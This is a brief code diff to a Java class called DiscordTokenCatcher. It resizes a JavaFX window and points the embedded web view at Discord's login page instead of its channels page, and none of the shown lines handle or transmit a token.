@@ -85,7 +85,7 @@ public class DiscordTokenCatcher {
 			}
 		});
 
-		DiscordTokenCatcher.frame.getContentPane().setPreferredSize(new Dimension(1024, 768));
+		DiscordTokenCatcher.frame.getContentPane().setPreferredSize(new Dimension(400, 650));
 		DiscordTokenCatcher.frame.pack();
 
 		Platform.runLater(() -> {
@@ -101,6 +101,6 @@ public class DiscordTokenCatcher {
 
 		final WebEngine webEngine = DiscordTokenCatcher.webView.getEngine();
 		webEngine.onResizedProperty();
-		webEngine.load("https://discord.com/channels/@me");
+		webEngine.load("https://discord.com/login");
 	}
 }
